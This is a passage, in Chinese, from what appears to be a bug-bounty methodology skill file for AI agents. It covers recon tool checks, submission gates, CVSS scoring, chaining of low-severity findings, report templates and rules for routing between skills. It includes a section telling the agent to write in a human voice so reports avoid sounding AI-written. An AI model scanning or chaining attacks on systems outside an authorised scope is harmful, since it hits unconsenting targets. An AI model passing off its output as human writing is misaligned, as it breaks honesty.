“技术上可能”不是影响。“我读取了受害者的 SSN”才是影响。

### Q4：按项目政策它是否在范围内？
对照项目的范围页面检查确切的域名/端点。

### Q5：我是否在 Hacktivity/changelog 中检查过重复？
搜索项目已披露的报告和最近的 changelog 条目。

### Q6：它是否不在“始终被拒”清单上？
检查下面的清单。如果它在清单上且你无法链接它 -> 扼杀它。

### Q7：读到这份报告的分诊员会说“对，这是真漏洞”吗？
把报告当作周五下午 5 点疲惫的分诊员来读。它能通过吗？

## Pitfalls

- **过度自动化而缺乏理解** —— 对每个子域名都跑 nuclei、ffuf 和 dalfox 会触发 WAF 拦截、速率限制和 IP 封禁。使用 `-rate` 和 `-t` 标志。人工探测能找到自动扫描器漏掉的漏洞。
- **违反 5 分钟规则** —— 在一个只返回 401/403/404 的目标上流连会浪费时间。5 分钟毫无结果后就继续下一个。
- **“可能”不是漏洞** —— 没有证明影响的理论攻击会被拒绝。证明它能工作，否则放弃。每个发现都必须展示实际损害：资金被盗、PII 泄露、账户接管或代码执行。
- **不含密钥的 source map** —— 找到 `.map` 文件属于侦察级别，不是漏洞。只有在同时提取到凭据或 API 密钥时才报告。
- **仅 DNS 回调的 SSRF** —— 仅凭 DNS 回连不能证明影响。需要数据外带、内部服务访问或云元数据检索。
- **单独的开放重定向** —— 没有 OAuth 链或 ATO 升级路径时，最多只是 informational。报告前先构建完整链。
- **没有方法地撒网** —— 在一次会话中在 XSS、IDOR、SSRF 和缓存投毒之间跳来跳去，必然只能得到浅层发现。每次会话只选一类漏洞并深入。
- **先写报告、后验证** —— 在确认漏洞在提交时仍然有效之前就写报告。提交前几分钟一定要重新测试。
- **用一个测试账户测试自己** —— IDOR/ATO 漏洞需要两个账户（攻击者 + 受害者）。用一个账户对自己测试什么都证明不了。
- **不先阅读已披露报告** —— 花数小时挖掘一个超出范围或已被严格缓解的类别是浪费时间。狩猎前先读 3 份以上已披露报告。
- **过度依赖单一字典** —— SecLists 是起点，不是终点。针对资产的字典（来自 JS 文件、API 响应、swagger 文档）效果优于通用字典。
- **忽略移动端 API 版本** —— 移动应用常常使用不同/`v1` 端点，其认证成熟度低于 Web 对应端。
- **通过子域名枚举造成范围蔓延** —— 确认每个子域名都属于目标。第三方服务通常不在范围内。
- **新功能 == 未审查** —— 过去 30 天内上线的任何东西安全成熟度最低、漏洞密度最高。

---

## Verification

运行此自检以确认工具包可用：

1. **核心工具检查** —— 确认关键 Go 二进制已安装：
   ```bash
   which subfinder httpx nuclei katana ffuf dalfox gau waybackurls 2>/dev/null
   ```

2. **FFUF 校准测试** —— 确认 `-ac` 自动校准可用：
   ```bash
   ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://example.com/FUZZ -ac -timeout 5 2>&1 | head -5
   ```

3. **Subfinder 连通性** —— 确认被动源可达：
   ```bash
   subfinder -d example.com -silent -timeout 30 2>&1 | head -3
   ```

4. **HackerOne API 可达性** —— 确认 GraphQL 端点可访问：
   ```bash
   curl --max-time 30 --connect-timeout 10 -s "https://hackerone.com/graphql" -o /dev/null -w "%{http_code}" && echo " PASS" || echo " FAIL"
   ```

5. **Semgrep 安装检查** —— 确认静态分析可用：
   ```bash
   semgrep --version >/dev/null 2>&1 && echo "PASS: semgrep available" || echo "FAIL: pip3 install semgrep"
   ```

6. **字典可用性** —— 确认 SecLists 已克隆：
   ```bash
   ls /usr/share/seclists/Discovery/Web-Content/common.txt >/dev/null 2>&1 && echo "PASS: SecLists present" || echo "FAIL: git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists"
   ```

全部 6 项测试都应通过，才算工具包完全可用。缺少的 Go 二进制可通过 `go install` 安装；Python 工具通过 `pip3 install` 安装。

---

## 4 道提交前门禁

### 门禁 0：现实检查（30 秒）
```
[ ] The bug is real -- confirmed with actual HTTP requests, not just code reading
[ ] The bug is in scope -- checked program scope explicitly
[ ] I can reproduce it from scratch (not just once)
[ ] I have evidence (screenshot, response, video)
```

### 门禁 1：影响验证（2 分钟）
```
[ ] I can answer: "What can an attacker DO that they couldn't before?"
[ ] The answer is more than "see non-sensitive data"
[ ] There's a real victim: another user's data, company's data, financial loss
[ ] I'm not relying on the user doing something unlikely
```

### 门禁 2：去重检查（5 分钟）
```
[ ] Searched HackerOne Hacktivity for this program + similar bug title
[ ] Searched GitHub issues for target repo
[ ] Read the most recent 5 disclosed reports for this program
[ ] This is not a "known issue" in their changelog or public docs
```

### 门禁 3：报告质量（10 分钟）
```
[ ] Title: One sentence, contains vuln class + location + impact
[ ] Steps to reproduce: Copy-pasteable HTTP request
[ ] Evidence: Screenshot/video showing actual impact (not just 200 response)
[ ] Severity: Matches CVSS 3.1 score AND program's severity definitions
[ ] Remediation: 1-2 sentences of concrete fix
```

## CVSS 3.1 快速指南

| 因素 | Low (0-3.9) | Medium (4-6.9) | High (7-8.9) | Critical (9-10) |
|--------|-------------|----------------|--------------|-----------------|
| 攻击向量 | Physical | Local | Adjacent | Network |
| 权限 | High | Low | None | None |
| 用户交互 | Required | Required | None | None |
| 影响 | Partial | Partial | High | High（全部 3 项） |

### 各类漏洞的典型评分

| 漏洞 | 典型 CVSS | 严重性 |
|----|------|---------|
| IDOR（读取 PII） | 6.5 | Medium |
| IDOR（写入/删除） | 7.5 | High |
| 认证绕过 -> 管理员 | 9.8 | Critical |
| 存储型 XSS | 5.4-8.8 | Med-High |
| SQLi（数据外带） | 8.6 | High |
| SSRF（云元数据） | 9.1 | Critical |
| 竞态条件（重复消费） | 7.5 | High |
| GraphQL 认证绕过 | 8.7 | High |
| JWT none 算法 | 9.1 | Critical |

---

# 始终被拒 —— 绝不要提交这些

缺少 CSP/HSTS/安全响应头、缺少 SPF/DKIM/DMARC、单独的 GraphQL introspection、没有可用 CVE 利用的 banner/版本泄露、非敏感页面上的点击劫持、tabnabbing、CSV 注入、没有凭据外带 PoC 的 CORS 通配符、登出 CSRF、self-XSS、单独的开放重定向、移动应用中的 OAuth client_secret、仅 DNS ping 的 SSRF、单独的 Host 头注入、非关键表单没有速率限制、登出时未使会话失效、并发会话、内部 IP 泄露、混合内容、SSL 弱加密套件、单独缺少 HttpOnly/Secure cookie 标志、失效的外部链接、预账户接管（通常）、密码字段的自动补全。

**N/A 会损害你的有效率。Informative 是中性的。只提交能通过 7 问门禁的内容。**

## 带链式利用时才有条件成立

这些低危发现串成链后才会成为有效漏洞：

| 低危发现 | + 链 | = 有效漏洞 |
|------------|---------|-------------|
| 开放重定向 | + OAuth 授权码窃取 | ATO |
| 点击劫持 | + 敏感操作 + PoC | 账户操作 |
| CORS 通配符 | + 带凭据外带 | 数据窃取 |
| CSRF | + 敏感状态变更 | 账户接管 |
| 无速率限制 | + OTP 暴力破解 | ATO |
| SSRF（仅 DNS） | + 内部访问证明 | 内网访问 |
| Host 头注入 | + 密码重置投毒 | ATO |
| Self-XSS | + 登录 CSRF | 受害者身上的存储型 XSS |

---

# 阶段 5：报告

## HackerOne 报告模板

```
Title: [Vuln Class] in [endpoint/feature] leads to [Impact]

## Summary
[2-3 sentences: what it is, where it is, what attacker can do]

## Steps To Reproduce
1. Log in as attacker (account A)
2. Send request: [paste exact request]
3. Observe: [exact response showing the bug]
4. Confirm: [what the attacker gained]

## Supporting Material
[Screenshot / video of exploitation]
[Burp Suite request/response]

## Impact
An attacker can [specific action] resulting in [specific harm].
[Quantify if possible: "This affects all X users" or "Attacker can access Y data"]

## Severity Assessment
CVSS 3.1 Score: X.X ([Severity label])
Attack Vector: Network | Complexity: Low | Privileges: None | User Interaction: None
```

## Bugcrowd 报告模板

```
Title: [Vuln] at [endpoint] -- [Impact in one line]

Bug Type: [IDOR/SSRF/XSS/etc]
Target: [URL or component]
Severity: [P1/P2/P3/P4]

Description:
[Root cause + exact location]

Reproduction:
1. [step]
2. [step]
3. [step]

Impact:
[Concrete business impact]

Fix Suggestion:
[Specific remediation]
```

## 真人语气规则（避免 AI 腔）

- 用影响开头，而不是漏洞名称
- 写得像在向一位聪明的开发者解释，而不是教科书
- 使用“我”和主动语态：“我发现……”而不是“发现了一个漏洞……”
- 一个具体例子胜于三句抽象陈述
- 不要使用破折号，也不要用“全面/赋能/无缝/确保”这类词

## 报告标题公式

```
[Bug Class] in [Exact Endpoint/Feature] allows [attacker role] to [impact] [victim scope]
```

**好的标题：**
```
IDOR in /api/v2/invoices/{id} allows authenticated user to read any customer's invoice data
Missing auth on POST /api/admin/users allows unauthenticated attacker to create admin accounts
Stored XSS in profile bio field executes in admin panel -- allows privilege escalation
SSRF via image import URL parameter reaches AWS EC2 metadata service
Race condition in coupon redemption allows same code to be used unlimited times
```

**差的标题：**
```
IDOR vulnerability found
Broken access control
XSS in user input
Security issue in API
```

## 影响陈述公式（第一段）

```
An [attacker with X access level] can [exact action] by [method], resulting in [business harm].
This requires [prerequisites] and leaves [detection/reversibility].
```

## 60 秒提交前检查清单

```
[ ] Title follows formula: [Class] in [endpoint] allows [actor] to [impact]
[ ] First sentence states exact impact in plain English
[ ] Steps to Reproduce has exact HTTP request (copy-paste ready)
[ ] Response showing the bug is included (screenshot or response body)
[ ] Two test accounts used (not just one account testing itself)
[ ] CVSS score calculated and included
[ ] Recommended fix is one sentence (not a lecture)
[ ] No typos in the endpoint path or parameter names
[ ] Report is < 600 words (triagers skim long reports)
[ ] Severity claimed matches impact described (don't overclaim)
```

## 严重性升级话术

当奖金被降级时，使用这些反驳：

| 项目方说 | 你反驳 |
|---|---|
| “需要认证” | “攻击者只需要一个免费账户（无需特殊角色）” |
| “影响有限” | “影响 [N] 名用户 / [PII 类型] / [$ 金额]” |
| “已已知” | “请给出报告编号 —— 我搜索过，没找到” |
| “这是设计如此” | “请给我说明这是预期行为的文档” |
| “CVSS 分数低” | “CVSS 没有考虑业务影响 —— 攻击者可以窃取 [X]” |

---

# 资源

## 漏洞赏金平台
- [HackerOne Hacktivity](https://hackerone.com/hacktivity) —— 已披露报告
- [Bugcrowd Crowdstream](https://bugcrowd.com/crowdstream) —— 公开发现
- [Intigriti Leaderboard](https://www.intigriti.com/researcher/leaderboard)

## 学习
- [PortSwigger Web Academy](https://portswigger.net/web-security) —— 免费漏洞实验环境（最佳）
- [HackTricks](https://book.hacktricks.xyz) —— 攻击技术参考
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) —— Payload 参考
- [Solodit](https://solodit.cyfrin.io) —— 5 万+ 可搜索的审计发现（Web3）
- [ProjectDiscovery Chaos](https://chaos.projectdiscovery.io) —— 免费子域名数据集

## 字典
- [SecLists](https://github.com/danielmiessler/SecLists) —— 全面的字典集合
- [HowToHunt](https://github.com/KathanP19/HowToHunt) —— 分步漏洞挖掘
- [DefaultCreds](https://github.com/ihebski/DefaultCreds-cheat-sheet) —— 默认凭据

## Payload 数据库
- [XSSHunter](https://xsshunter.trufflesecurity.com/) —— 盲 XSS 检测
- [interactsh](https://app.interactsh.com) —— OOB 回调服务器

---

# 安装

本文件是一个可移植的方法论技能。用你使用的任意智能体或工作流加载它；它只假设存在 Prerequisites 中列出的工具。

---

## 相关技能与链

- **`bb-methodology`** —— 当一次狩猎会话开始、用户“不知道下一步做什么”时使用。工作流原语：本技能是编排器；`bb-methodology` 是它路由到的 5 阶段工作流。先加载 `bb-methodology`，然后由本技能指出与主题匹配的 hunt-* 技能。
- **`hunt-dispatch`** —— 当 PART 0 模式（红队 / WAPT）已确认时使用。工作流原语：本技能的“我该做什么”路由会移交给 `hunt-dispatch`，由其完成平台指纹识别 + 技能集加载。
- **`web2-recon`** + **`offensive-osint`** —— 当阶段 1（侦察）开始时使用。工作流原语：本技能的“标准侦察流程”一节把实际执行委托给 `web2-recon`，把作战武器库（探测 / 字典 / 正则）委托给 `offensive-osint`。
- **`triage-validation`** + **`report-writing`** —— 当一个发现完成阶段 4 时使用。工作流原语：本技能路由到 `triage-validation`（7Q 门禁）→ 只有全部 7 项通过，才移交给 `report-writing` 撰写平台特定的正文。

---

## 操作员笔记

> 在 vendored 基础之上、源自实际交战的补充内容。智慧来自真实的
> 授权交战 + 本仓库 31+ 个技能领域实弹测试的阶段 2 验证。上游方法论
> 覆盖 WHAT；这一层覆盖 WHEN-IT-ACTUALLY-WORKS 以及 FAILURE-MODES。

### 何时使用编排器，何时直接使用技能

编排器（本技能）适用于“我还不知道要挖哪类漏洞”的情况。如果你已经确定了候选对象 —— “响应把我的 Host 头反射进 JavaScript src URL，这是缓存投毒” —— 就直接加载 `hunt-cache-poison`。编排器的价值在于从模糊意图（“这里有个聊天机器人，我该测什么”）到具体技能集（`hunt-llm-ai` + `hunt-api-misconfig`）的初始路由。

拿不准时：在任何新目标上先打开编排器，让它路由，然后关闭编排器，在已加载的技能中工作。不要整场会话都保留编排器 —— 它占用的上下文窗口本可以存放实际探测结果。

### 常见误用：同时加载所有 hunt-* 技能

本仓库有 30+ 个 hunt-* 技能。每个都带有不小的上下文占用。编排器的职责是按主题匹配挑选 2-3 个，而不是倾倒整个技能库。如果用户说“挖这个 SaaS 应用”，不要加载所有 hunt-* 技能 —— 选择 `web2-recon` + `hunt-idor` + `hunt-api-misconfig`（SaaS 典型三件套）并到此为止。只有当侦察输出提示存在某个特定附加类别时才增加（例如发现 GraphQL 端点 → 添加 `hunt-graphql`）。

### 与 hunt-dispatch 的集成

本技能按**漏洞类别**（主题匹配）路由。本仓库新增的 `hunt-dispatch` 技能按**交战模式**（红队 vs WAPT，黑盒 vs 灰盒）路由。两者组合使用：

1. 用户说“挖 example.com”
2. `bb-methodology` 的 PART 0 确认模式（例如 bug-bounty 黑盒）
3. `hunt-dispatch` 加载平台特定的攻击画像
4. 本编排器（`bug-bounty`）在选定画像内指出与主题匹配的 hunt-* 技能

不要跳过任何一步。模式决定什么算作发现；主题决定适用哪些技术。

### 交战脚手架

`/hunt` 斜杠命令和 `hunt <target>` shell 辅助脚本（见本仓库的 `cmd/` 目录）会预先创建交战脚手架：

- `targets/<target>/scope.md` —— 从项目页面粘贴的声明范围
- `targets/<target>/findings/` —— 每个已验证发现一个 MD 文件
- `targets/<target>/evidence/` —— HAR、截图、脱敏 curl 记录
- `targets/<target>/submissions.txt` —— 已提交报告 URL + 状态的日志
- `targets/<target>/recon/` —— `subfinder | dnsx | httpx | katana` 的输出

从一开始就使用脚手架。半组织化的交战会丢发现 —— 第 2 小时一个看似不重要的探测结果，到第 14 小时才显得关键，如果没有记录就再也找不回来了。

### 编排器出错时

在本仓库 30+ 次阶段 2 验证测试中，编排器在每次测试中都正确自动触发了匹配的技能 —— 零误触发。如果未来在某个目标上编排器路由错误（为主题加载了错误的 hunt-*），原因几乎总是目标技能的 `description:` frontmatter 字段：缺少一个本应匹配用户意图的关键词。向前修复的方法是编辑该技能的 frontmatter `description:` 字段，加入缺失的触发词。不要增加另一层分派逻辑；收紧描述即可。
- **`bb-methodology`** —— 当问题是“我从哪里开始 / 下一步做什么”而不是某个具体类别时使用。工作流原语：本技能指出与主题匹配的 hunt-* 技能；`bb-methodology` 拥有 5 阶段工作流和交战模式门禁。
